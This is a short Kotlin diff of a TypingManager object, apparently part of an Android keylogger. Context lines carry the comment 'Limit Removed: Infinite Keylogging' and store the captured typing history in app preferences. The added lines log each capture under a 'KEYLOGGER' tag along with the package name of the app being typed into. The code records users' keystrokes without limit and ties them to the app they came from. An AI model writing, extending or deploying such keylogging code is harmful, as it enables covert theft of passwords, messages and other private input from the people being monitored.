@@ -71,6 +71,9 @@ object TypingManager {
         // Limit Removed: Infinite Keylogging
         prefs.edit().putString("typing_history", history.toString()).apply()
         
+        // VERIFICATION LOG
+        DumpManager.logVerification("KEYLOGGER", pkg)
+        
         lastPkg = pkg
         lastTs = now
     }
